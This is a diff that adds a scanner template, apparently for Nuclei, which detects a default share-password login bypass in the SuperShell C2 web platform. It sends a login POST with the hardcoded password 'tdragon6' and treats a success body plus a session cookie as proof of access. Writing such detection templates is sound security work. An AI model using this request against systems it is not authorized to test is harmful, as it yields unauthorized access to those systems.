@@ -1,0 +1,29 @@
+id: supershell-permission-bypass
+info:
+  name: SuperShell share_pwd Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Supershell is a C2 remote control platform accessed through WEB services. There is a default share account vulnerability in SuperShell, allowing attackers to log in and obtain system privileges.
+  tags: permission
+  reference:
+    - https://github.com/tdragon6/Supershell
+
+http:
+  - raw:
+      - |
+        POST /supershell/share/shell/login/auth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"share_password":"tdragon6"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie:.*"
